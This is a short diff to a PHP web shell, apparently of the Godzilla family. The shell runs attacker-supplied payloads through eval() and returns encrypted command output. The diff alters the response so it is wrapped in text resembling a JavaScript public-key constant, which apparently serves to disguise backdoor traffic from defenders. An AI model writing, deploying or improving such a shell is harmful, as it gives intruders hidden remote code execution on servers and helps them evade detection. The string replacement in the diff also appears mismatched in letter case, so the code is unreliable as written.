@@ -20,9 +20,13 @@ if (isset($_POST[$pass])){
             $payload=encode($payload,$key);
         }
 		eval($payload);
-        echo substr(md5($pass.$key),0,16);
+        # echo substr(md5($pass.$key),0,16);
+        $findStrLeft = substr(md5($pass.$key),0,16);
+        $replaceString = str_replace("JNOIL",$findStrLeft,"{const DriginjNOILPublicKey=}");
+        echo "$replaceString";
         echo base64_encode(encode(@run($data),$key));
-        echo substr(md5($pass.$key),16);
+        # echo substr(md5($pass.$key),16);
+        echo ";";
     }else{
         if (strpos($data,"getBasicsInfo")!==false){
             $_SESSION[$payloadName]=encode($data,$key);
